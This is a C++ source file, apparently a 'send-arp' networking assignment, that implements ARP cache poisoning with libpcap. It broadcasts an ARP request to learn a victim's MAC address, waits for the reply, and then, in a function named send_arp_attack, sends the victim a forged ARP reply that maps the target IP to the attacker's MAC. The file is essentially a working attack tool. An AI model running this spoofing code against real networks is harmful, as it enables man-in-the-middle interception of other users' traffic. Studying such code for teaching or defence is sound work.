#include "send-arp.h"

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void request_sender_mac(pcap_t* handle, uint8_t* my_mac, uint32_t my_ip, uint32_t sender_ip) {
        EthArp packet;

        memset(packet.eth_.dmac_, 0xFF, 6);
        memcpy(packet.eth_.smac_, my_mac, 6);
        packet.eth_.type_ = htons(EthHdr::ARP);

        packet.arp_.hrd_ = htons(ArpHdr::ETHERNET);
        packet.arp_.pro_ = htons(EthHdr::IP4);
        packet.arp_.hlen_ = 0x06;
        packet.arp_.plen_ = 0x04;
        packet.arp_.op_ = htons(ArpHdr::REQUEST);
        memcpy(packet.arp_.smac_, my_mac, 6);
        packet.arp_.sip_ = htonl(my_ip);
        memset(packet.arp_.dmac_, 0x00, 6);
        packet.arp_.dip_ = htonl(sender_ip);

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArp));
        if (res != 0) {
            fprintf(stderr, "request sender mac packet return %d error=%s\n", res, pcap_geterr(handle));
        }
}

bool analysis_sender_mac(pcap_t* handle, uint32_t sender_ip, uint32_t target_ip, uint8_t* sender_mac) {
    struct pcap_pkthdr* header;
    const u_char* packet;

    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue; 
        if (res < 0) {
            fprintf(stderr, "pcap_next_ex error\n");
            return false;
        }

        EthArp* eth_arp = (EthArp*)(packet);
        if (ntohl(eth_arp->arp_.sip_) == target_ip &&
            ntohl(eth_arp->arp_.dip_) == sender_ip &&
            ntohs(eth_arp->arp_.op_) == ArpHdr::REPLY) {
                memcpy(sender_mac, eth_arp->arp_.smac_, 6);
                return true;
        }
    }
}

void send_arp_attack(pcap_t* handle, uint8_t* sender_mac, uint32_t sender_ip, uint32_t target_ip, uint8_t* my_mac) {
    EthArp packet;

    memcpy(packet.eth_.dmac_, sender_mac, 6);
    memcpy(packet.eth_.smac_, my_mac, 6);
    packet.eth_.type_ = htons(EthHdr::ARP);

    packet.arp_.hrd_ = htons(ArpHdr::ETHERNET);
    packet.arp_.pro_ = htons(EthHdr::IP4);
    packet.arp_.hlen_ = 0x06;
    packet.arp_.plen_ = 0x04;
    packet.arp_.op_ = htons(ArpHdr::REPLY);
    memcpy(packet.arp_.smac_, my_mac, 6);
    packet.arp_.sip_ = htonl(target_ip);
    memcpy(packet.arp_.dmac_, sender_mac, 6);
    packet.arp_.dip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArp));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}